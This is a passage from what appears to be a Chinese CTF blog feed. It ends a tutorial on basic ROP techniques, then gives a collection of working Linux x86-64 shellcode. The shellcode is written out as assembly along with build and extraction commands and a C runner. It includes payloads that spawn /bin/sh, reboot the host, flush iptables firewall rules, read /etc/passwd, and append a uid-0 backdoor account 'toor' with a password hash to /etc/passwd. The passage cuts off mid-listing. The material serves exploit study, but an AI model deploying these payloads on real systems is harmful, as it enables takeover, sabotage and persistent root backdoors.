向前搜索，看前面的字节是否包含一个有效指令，这里可以指定最大搜索字节数，以获得不同长度的 gadgets</p><p>/3. 记录下我们找到的所有有效指令序列</p><p>理论上我们是可以这样寻找 gadgets 的，但实际上有很多工具可以完成这个工作，如 ROPgadget，Ropper 等。更完整的搜索可以使用 <a href="http://ropshell.com/%E3%80%82">http://ropshell.com/。</a></p><h3 id="常用的-gadgets"><a class="markdownIt-Anchor" href="#常用的-gadgets"></a> 常用的 gadgets</h3><p>对于 gadgets 能做的事情，基本上只要你敢想，它就敢执行。下面简单介绍几种用法：</p><ul><li>保存栈数据到寄存器<ul><li>将栈顶的数据抛出并保存到寄存器中，然后跳转到新的栈顶地址。所以当返回地址被一个 gadgets 的地址覆盖，程序将在返回后执行该指令序列。</li><li>如：<code>pop eax; ret</code></li></ul></li><li>保存内存数据到寄存器<ul><li>将内存地址处的数据加载到内存器中。</li><li>如：<code>mov ecx,[eax]; ret</code></li></ul></li><li>保存寄存器数据到内存<ul><li>将寄存器的值保存到内存地址处。</li><li>如：<code>mov [eax],ecx; ret</code></li></ul></li><li>算数和逻辑运算<ul><li>add, sub, mul, xor 等。</li><li>如：<code>add eax,ebx; ret</code>, <code>xor edx,edx; ret</code></li></ul></li><li>系统调用<ul><li>执行内核中断</li><li>如：<code>int 0x80; ret</code>, <code>call gs:[0x10]; ret</code></li></ul></li><li>会影响栈帧的 gadgets<ul><li>这些 gadgets 会改变 ebp 的值，从而影响栈帧，在一些操作如 stack pivot 时我们需要这样的指令来转移栈帧。</li><li>如：<code>leave; ret</code>, <code>pop ebp; ret</code></li></ul></li></ul><h2 id="ret2text"><a class="markdownIt-Anchor" href="#ret2text"></a> ret2text</h2><h3 id="原理"><a class="markdownIt-Anchor" href="#原理"></a> 原理</h3><p>ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。</p><p>这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。</p><h3 id="例子"><a class="markdownIt-Anchor" href="#例子"></a> 例子</h3><p><a href="https://www.rgzzplus.com/2022/09/05/ret2text/">ret2text@rgzzplus</a></p><h2 id="ret2shellcode"><a class="markdownIt-Anchor" href="#ret2shellcode"></a> ret2shellcode</h2><h3 id="原理-2"><a class="markdownIt-Anchor" href="#原理-2"></a> 原理</h3><p>ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。<strong>一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码</strong>。</p><p>在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。</p><h3 id="例子-2"><a class="markdownIt-Anchor" href="#例子-2"></a> 例子</h3><p><a href="https://www.rgzzplus.com/2022/09/05/ret2shellcode/">ret2shellcode@rgzzplus</a></p><h2 id="ret2syscall"><a class="markdownIt-Anchor" href="#ret2syscall"></a> ret2syscall</h2><h3 id="原理-3"><a class="markdownIt-Anchor" href="#原理-3"></a> 原理</h3><p>ret2syscall，即控制程序执行系统调用，获取 shell。</p><h3 id="例子-3"><a class="markdownIt-Anchor" href="#例子-3"></a> 例子</h3><p><a href="https://www.rgzzplus.com/2022/09/18/ret2syscall/">ret2syscall@rgzzplus</a></p><h2 id="ret2libc"><a class="markdownIt-Anchor" href="#ret2libc"></a> ret2libc</h2><h3 id="原理-4"><a class="markdownIt-Anchor" href="#原理-4"></a> 原理</h3><p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(&quot;/bin/sh&quot;)，故而此时我们需要知道 system 函数的地址。</p><h3 id="例子-4"><a class="markdownIt-Anchor" href="#例子-4"></a> 例子</h3><p><a href="https://www.rgzzplus.com/2022/09/18/ret2libc/">ret2libc@rgzzplus</a></p><h2 id="其它例子"><a class="markdownIt-Anchor" href="#其它例子"></a> 其它例子</h2><p><a href="https://www.rgzzplus.com/2022/09/18/ret2win/">ret2win@rgzzplus</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;基本-rop&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#基本-rop&quot;&gt;&lt;/a&gt; 基本 ROP&lt;/h1&gt;
&lt;h2 id=&quot;rop-简介&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#rop-简介&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="CTF" scheme="https://www.rgzzplus.com/categories/CTF/"/>
    
    
    <category term="ROP" scheme="https://www.rgzzplus.com/tags/ROP/"/>
    
  </entry>
  
  <entry>
    <title>shellcode_linux_x86_64</title>
    <link href="https://www.rgzzplus.com/2022/09/06/shellcode-linux-x86-64/"/>
    <id>https://www.rgzzplus.com/2022/09/06/shellcode-linux-x86-64/</id>
    <published>2022-09-06T08:21:17.000Z</published>
    <updated>2022-09-06T08:21:38.822Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><blockquote><p>本文是我的另一篇文章的精简版，删除了参考文章，以及一些额外的解释，只保留了最关键的部分。如想学习写shellcode，可以去阅读 <a href="https://www.rgzzplus.com/2022/08/08/Linux-shellcode%E5%BC%80%E5%8F%91%E4%B9%8B%E5%AE%9E%E6%88%98/">Linux_shellcode开发之实战</a></p></blockquote><h1 id="0-readme"><a class="markdownIt-Anchor" href="#0-readme"></a> 0. README</h1><p>下列文章中的汇编代码，用下面的命令编译运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">nasm -f elf64 fileName.asm</span> </span><br><span class="line"><span class="meta">$ </span><span class="language-bash">ld -m elf_x86_64 fileName.o -o fileName</span> </span><br><span class="line"><span class="meta">$ </span><span class="language-bash">./fileName</span> </span><br></pre></td></tr></table></figure><blockquote><p>注意：这里和下面的 fileName，都要用实际相应的文件名替换。</p></blockquote><p>用下面这串命令，来自动提取机器码：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in $(objdump  -d fileName.o | grep &quot;^ &quot; | cut  -f2); do echo  -n  &#x27;\x&#x27;$i; done; echo </span><br></pre></td></tr></table></figure><blockquote><p>注意：提取出的机器码放在 c语言代码的 shellcode[] 这个常量数组中。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//fileName.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> shellcode[] =  <span class="string">&quot;/*将机器码放在这里*/&quot;</span>;</span><br><span class="line">    <span class="comment">//当shellcode包含空字符时，printf 将会打印出错误的 shellcode 长度</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Shellcode length: %d bytes\n&quot;</span>,<span class="built_in">strlen</span>(shellcode));</span><br><span class="line">    (*(<span class="type">void</span>(*)())shellcode)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>搭建好的 c语言代码，用下面的命令编译运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">gcc fileName.c -o fileName -z execstack -z norelro -no-pie -g</span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash">./execve_sh64</span></span><br></pre></td></tr></table></figure><p>以下，只提供汇编代码，相应参数我会在代码头做相应注释。</p><h1 id="1-打开-terminal"><a class="markdownIt-Anchor" href="#1-打开-terminal"></a> 1. 打开 terminal</h1><h2 id="0x1"><a class="markdownIt-Anchor" href="#0x1"></a> 0x1</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">; execveSh64_30.asm</span><br><span class="line">; length = 30 bytes</span><br><span class="line">global _start</span><br><span class="line">section .text</span><br><span class="line"> </span><br><span class="line">_start:</span><br><span class="line">; execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;], NULL)</span><br><span class="line">; rax = 0x3b, rdx= NULL, rdi = &#x27;//bin/sh&#x27;, rsi = &#x27;//bin/sh&#x27;</span><br><span class="line">xorrdx, rdx</span><br><span class="line">movqword rbx, &#x27;//bin/sh&#x27;; 0x68732f6e69622f2f</span><br><span class="line">shrrbx, 0x8</span><br><span class="line">pushrbx</span><br><span class="line">movrdi, rsp</span><br><span class="line">pushrax</span><br><span class="line">pushrdi</span><br><span class="line">movrsi, rsp</span><br><span class="line">moval, 0x3b</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><h2 id="0x2"><a class="markdownIt-Anchor" href="#0x2"></a> 0x2</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">; execveSh64_28.asm</span><br><span class="line">; length = 28 bytes</span><br><span class="line">global _start</span><br><span class="line">section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">xor rcx, rcx</span><br><span class="line">mul rcx</span><br><span class="line"></span><br><span class="line">add al, 0x3b     ; execve()</span><br><span class="line">mov rbx, 0x68732f2f6e69622f ; hs//nib/</span><br><span class="line"></span><br><span class="line">; Argument one shell[0] = &quot;/bin//sh&quot;</span><br><span class="line">push rdx     ; null</span><br><span class="line">push rbx     ; hs//nib/</span><br><span class="line"></span><br><span class="line">; We need pointers for execve()</span><br><span class="line">push rsp     ; *pointer to shell[0]</span><br><span class="line">pop rdi      ; Argument 1</span><br><span class="line"></span><br><span class="line">; Argument two shell (including address of each argument in array)</span><br><span class="line">push rdx     ; null</span><br><span class="line">push rdi     ; address of shell[0]</span><br><span class="line"></span><br><span class="line">; We need pointers for execve()</span><br><span class="line">push rsp     ; address of char * shell</span><br><span class="line">pop rsi      ; Argument 2</span><br><span class="line"></span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><h2 id="0x3"><a class="markdownIt-Anchor" href="#0x3"></a> 0x3</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">;execveSh64_27.asm</span><br><span class="line">global _start</span><br><span class="line">section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">xor eax, eax</span><br><span class="line">mov rbx, 0xFF978CD091969DD1</span><br><span class="line">neg rbx</span><br><span class="line">push rbx</span><br><span class="line">;mov rdi, rsp</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">cdq</span><br><span class="line">push rdx</span><br><span class="line">push rdi</span><br><span class="line">;mov rsi, rsp</span><br><span class="line">push rsp</span><br><span class="line">pop rsi</span><br><span class="line">mov al, 0x3b</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://blog.csdn.net/zmrz1/article/details/53349631">关于汇编语言中cdq指令作用解惑</a></p><p>cdq的作用无非就是将一个32位有符合数扩展为64位有符合数，数据能表示的数不变，具体是这样实现的，比如eax=fffffffb（值为-5），然后cdq把eax的最高位bit，也就是二进制1，全部复制到edx的每一个bit位，EDX 变成 FFFFFFFF，这时eax与edx连起来就是一个64位数，FFFFFFFF FFFFFFFB ，它是一个 64 bit 的大型数字，数值依旧是 -5</p></blockquote><h1 id="2-重启-reboot"><a class="markdownIt-Anchor" href="#2-重启-reboot"></a> 2. 重启 reboot</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">; execveReboot.asm</span><br><span class="line">global _start</span><br><span class="line">section .text</span><br><span class="line"> </span><br><span class="line">_start:</span><br><span class="line">; execve(&quot;/usr/sbin/reboot&quot;, [&quot;/usr/sbin/reboot&quot;], NULL)</span><br><span class="line">; rax = 0x3b, rdx= NULL, rdi = &#x27;/usr/sbin/reboot&#x27;, rsi = &#x27;/usr/sbin/reboot&#x27;</span><br><span class="line">xorrdx, rdx</span><br><span class="line">push  rdx</span><br><span class="line">movrbx, &#x27;n/reboot&#x27;</span><br><span class="line">pushrbx</span><br><span class="line">mov rbx, &#x27;/usr/sbi&#x27;</span><br><span class="line">push rbx</span><br><span class="line">movrdi, rsp</span><br><span class="line">pushrax</span><br><span class="line">pushrdi</span><br><span class="line">movrsi, rsp</span><br><span class="line">moval, 0x3b</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><h1 id="3-关闭防火墙清空-iptable"><a class="markdownIt-Anchor" href="#3-关闭防火墙清空-iptable"></a> 3. 关闭防火墙（清空 iptable）</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">; clearIptable.asm</span><br><span class="line">; 注：需要root权限</span><br><span class="line">section .text</span><br><span class="line">global _start</span><br><span class="line">         </span><br><span class="line">_start:</span><br><span class="line">    xor     rax, rax</span><br><span class="line">    push    rax</span><br><span class="line">    push    word 0x462d</span><br><span class="line">    mov     rcx, rsp</span><br><span class="line">       </span><br><span class="line">    mov     rbx, 0x73656c626174ffff</span><br><span class="line">    shr     rbx, 0x10</span><br><span class="line">    push    rbx</span><br><span class="line">    mov     rbx, 0x70692f6e6962732f</span><br><span class="line">    push    rbx</span><br><span class="line">    mov     rdi, rsp</span><br><span class="line">         </span><br><span class="line">    push    rax</span><br><span class="line">    push    rcx</span><br><span class="line">    push    rdi</span><br><span class="line">    mov     rsi, rsp</span><br><span class="line">        </span><br><span class="line">    ; execve(&quot;/sbin/iptables&quot;, [&quot;/sbin/iptables&quot;, &quot;-F&quot;], NULL);</span><br><span class="line">    mov     al, 0x3b</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure><h1 id="4-passwd"><a class="markdownIt-Anchor" href="#4-passwd"></a> 4. passwd</h1><h2 id="41-读取-passwd"><a class="markdownIt-Anchor" href="#41-读取-passwd"></a> 4.1 读取 passwd</h2><h3 id="cat-读取"><a class="markdownIt-Anchor" href="#cat-读取"></a> cat 读取</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">; catPasswd.asm</span><br><span class="line">; execve(&quot;/bin/cat&quot;, [&quot;/bin/cat&quot;, &quot;/etc/passwd&quot;], NULL)</span><br><span class="line"></span><br><span class="line">global _start</span><br><span class="line">section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line"></span><br><span class="line">       xor rax, rax                   ; Zeroes out RAX.</span><br><span class="line">       xor rbp, rbp                   ; Zeroes out RBP.</span><br><span class="line"></span><br><span class="line">       push rax                       ; Pushes RAX&#x27;s NULL-DWORD.</span><br><span class="line"></span><br><span class="line">       mov rbp, 0x6477737361702f63    ; Moves value &quot;dwsspa/c&quot; into RBP.</span><br><span class="line">       push rbp                       ; Pushes the vaueof RBP into the Stack.</span><br><span class="line"></span><br><span class="line">       mov rbp, 0x74652f2f2f2f2f2f    ; Moves value &quot;te//////&quot; into RBP.</span><br><span class="line">       push rbp                       ; Pushes the vaue of RBP into the Stack.</span><br><span class="line"></span><br><span class="line">       mov rbp, rsp                   ; Copies the value of the Stack into RBP.</span><br><span class="line">       push rax                       ; Pushes RAX&#x27;s NULL-DWORD.</span><br><span class="line"></span><br><span class="line">       mov rbx, 0x7461632f6e69622f    ; Moves value &quot;tac/nib/&quot; into RBX.</span><br><span class="line">       push rbx                       ; Pushes the vaue of RBX into the Stack.</span><br><span class="line"></span><br><span class="line">       mov rbx, rsp                   ; Copies the value of the Stack into RBX.</span><br><span class="line"></span><br><span class="line">       mov rdi, rsp                   ; Copies the value of the Stack into RDI.</span><br><span class="line">       push rax                       ; Pushes RAX&#x27;s NULL-DWORD.</span><br><span class="line"></span><br><span class="line">       mov rdx, rsp                   ; Copies the value of the Stack into RDX. As the previous DWORD was completely NULL, RDX is set to 0.</span><br><span class="line"></span><br><span class="line">       push rbp                       ; Pushes the vaue of RBP into the Stack.</span><br><span class="line">       push rbx                       ; Pushes the vaue of RBX into the Stack. The full string should be &quot;cat /etc/passwd&quot;.</span><br><span class="line"></span><br><span class="line">       mov rsi, rsp                   ; Copies this entire string from the Stack into RSI.</span><br><span class="line"></span><br><span class="line">       push word 59                   ; Pushes the value 59 (syscall value for execve in the x64 format).</span><br><span class="line">       pop ax                         ; Pops this value into AX so there are no NULLs.</span><br><span class="line">       syscall                        ; The syscall is executed.</span><br></pre></td></tr></table></figure><h3 id="系统调用读取"><a class="markdownIt-Anchor" href="#系统调用读取"></a> 系统调用读取</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">; readPasswd.asm</span><br><span class="line">global _start</span><br><span class="line">section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">jmp _push_filename</span><br><span class="line">  </span><br><span class="line">_readfile:</span><br><span class="line">; syscall open file, 0x2</span><br><span class="line">; open(&#x27;/etc/passwd&#x27;, O_RDWR), O_RDWR=0x2</span><br><span class="line">pop rdi ; pop path value</span><br><span class="line">xor rax, rax</span><br><span class="line">add al, 2</span><br><span class="line">xor rsi, rsi ; set O_RDWR flag</span><br><span class="line">syscall</span><br><span class="line">  </span><br><span class="line">; syscall read file, 0x0</span><br><span class="line">; read(fd, buf, 0xfff), rdi=rax=fd(fd is open&#x27;s return number)</span><br><span class="line">sub sp, 0xfff</span><br><span class="line">lea rsi, [rsp]</span><br><span class="line">mov rdi, rax</span><br><span class="line">xor rdx, rdx</span><br><span class="line">mov dx, 0xfff; size to read</span><br><span class="line">xor rax, rax</span><br><span class="line">syscall</span><br><span class="line">  </span><br><span class="line">; syscall write to stdout, 0x1</span><br><span class="line">; write(fd, buf, 0xfff)</span><br><span class="line">xor rdi, rdi</span><br><span class="line">inc rdi ; set stdout fd = 1</span><br><span class="line">mov rdx, rax</span><br><span class="line">xor rax, rax</span><br><span class="line">inc rax</span><br><span class="line">syscall</span><br><span class="line">  </span><br><span class="line">; syscall exit</span><br><span class="line">xor rax, rax</span><br><span class="line">add al, 60</span><br><span class="line">syscall</span><br><span class="line">  </span><br><span class="line">_push_filename:</span><br><span class="line">call _readfile</span><br><span class="line">path: db &quot;/etc/passwd&quot;</span><br></pre></td></tr></table></figure><h2 id="42-写入-passwd"><a class="markdownIt-Anchor" href="#42-写入-passwd"></a> 4.2 写入 passwd</h2><h3 id="0x1-2"><a class="markdownIt-Anchor" href="#0x1-2"></a> 0x1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">; addRootUser.asm</span><br><span class="line">; 注：需要root权限</span><br><span class="line">; Action: Adds a user into /etc/passwd with the following information</span><br><span class="line">; username: toor</span><br><span class="line">; password: toor</span><br><span class="line">; uid: 0</span><br><span class="line">; gid: 0</span><br><span class="line">; home: /root</span><br><span class="line">; shell: /bin/sh</span><br><span class="line">;</span><br><span class="line">; toor:sXuCKi7k3Xh/s:0:0::/root:/bin/sh</span><br><span class="line"></span><br><span class="line">global _start</span><br><span class="line"></span><br><span class="line">section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">jmp _push_filename</span><br><span class="line"></span><br><span class="line">; #define __NR_open 2</span><br><span class="line">; int open(const char *pathname, int flags);</span><br><span class="line">; rax -&gt; 2</span><br><span class="line">; rdi -&gt; /etc/passwd</span><br><span class="line">; rsi -&gt; 0x401</span><br><span class="line">;</span><br><span class="line">; &gt;&gt;&gt; hex(os.O_WRONLY ^ os.O_APPEND)</span><br><span class="line">; 0x401</span><br><span class="line">_openfile:</span><br><span class="line">pop rdi   ; rdi -&gt; /etc/passwd</span><br><span class="line">xor rax, rax</span><br><span class="line">xor rsi, rsi  ; rsi to zero</span><br><span class="line">mov si, 0x401 ; rsi -&gt; O_WRONLY|O_APPEND</span><br><span class="line">add al, 0x2 ; rax -&gt; 2 (open)</span><br><span class="line">syscall ; open</span><br><span class="line"></span><br><span class="line">xchg rdi, rax ; save returned fd</span><br><span class="line">jmp short get_entry_address ; start jmp-call-pop</span><br><span class="line"></span><br><span class="line">write_entry:</span><br><span class="line">; #define __NR_write 1</span><br><span class="line">; ssize_t write(int fd, const void *buf, size_t count);</span><br><span class="line">; rax -&gt; 1</span><br><span class="line">; rdi -&gt; results of open syscall</span><br><span class="line">; rsi -&gt; user&#x27;s entry</span><br><span class="line">; rdx -&gt; len of user&#x27;s entry</span><br><span class="line">pop rsi ; end jmp-call-pop, rsi -&gt; user&#x27;s entry</span><br><span class="line">push 0x1</span><br><span class="line">pop rax ; rax -&gt; 1</span><br><span class="line">push 38 ; length + 1 for newline</span><br><span class="line">pop rdx ; rdx -&gt; length of user&#x27;s entry</span><br><span class="line">syscall ; write</span><br><span class="line"></span><br><span class="line">; #define __NR_exit 60</span><br><span class="line">; void _exit(int status);</span><br><span class="line">; rax -&gt; 60</span><br><span class="line">; rdi -&gt; don&#x27;t care</span><br><span class="line">push 60</span><br><span class="line">pop rax</span><br><span class="line">syscall ; OS will handle closing fd at exit</span><br><span class="line"></span><br><span class="line">get_entry_address:</span><br><span class="line">call write_entry</span><br><span class="line">user_entry: db &quot;toor:sXuCKi7k3Xh/s:0:0::/root:/bin/sh&quot;,0xa</span><br><span class="line"></span><br><span class="line">_push_filename:</span><br><span class="line">call _openfile</span><br><span class="line">path: db &quot;/etc/passwd&quot;</span><br></pre></td></tr></table></figure><h3 id="0x2-2"><a class="markdownIt-Anchor" href="#0x2-2"></a> 0x2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">; addRootUser_tor.asm</span><br><span class="line">; 注；需要root权限</span><br><span 